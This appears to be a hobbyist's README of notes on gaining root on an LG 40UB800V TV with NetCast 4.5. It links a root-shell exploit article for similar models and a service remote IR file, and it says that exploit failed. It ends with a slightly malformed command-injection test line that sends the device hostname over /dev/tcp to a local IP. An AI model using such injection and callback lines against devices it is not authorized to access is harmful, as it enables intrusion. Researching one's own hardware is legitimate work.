# lg-40ub800v
Exploring NetCast4.5 on lg 40ub800v

Exploit of a similar model:

https://www.encrypted.at/remote-root-shell-on-lg-tv-2013-netcast-models/

Service Remote IR File:

https://github.com/logickworkshop/Flipper-IRDB/blob/main/TVs/LG/LG_MKJ39170828_Service.ir

Charriot Endpoint is startable

Exploit from article above does not work

Thought about something like this:



Serial adapter(?):

you can connect a PL2303-based USB/serial adapter
although it may require specific VID/PID (aten UC232)

Testing TCP Connections?

Maybe this works?

```
"Hi from LGTV at $(uname -n)" 2>/dev/null > /dev/tcp/192.168.178.123/8989"
```
